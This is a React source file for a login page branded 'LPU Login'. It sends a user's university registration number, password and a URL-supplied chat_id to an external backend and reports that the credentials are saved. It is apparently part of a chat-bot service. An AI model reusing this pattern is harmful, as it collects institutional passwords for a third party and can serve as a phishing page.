import { useState } from "react";
import "./App.css";

function App() {
  // ✅ Extract chat_id from URL params
  const urlParams = new URLSearchParams(window.location.search);
  const chatId = urlParams.get("chat_id");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/login`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          username,
          password,
          chat_id: chatId,   // ✅ automatically included
        }),
      });

      if (res.ok) {
        setMessage("✅ Login successful! Credentials saved.");
      } else {
        setMessage("❌ Login failed. Try again.");
      }
    } catch (err) {
      console.error(err);
      setMessage("⚠️ Server error.");
    }
  };

  return (
    <div className="login-page">
      <form onSubmit={handleSubmit}>
        <h2>🔐 LPU Login</h2>
        <input
          type="text"
          placeholder="Registration Number"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          required
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
        <button type="submit">Login</button>
        {message && <p>{message}</p>}
      </form>
    </div>
  );
}

export default App;
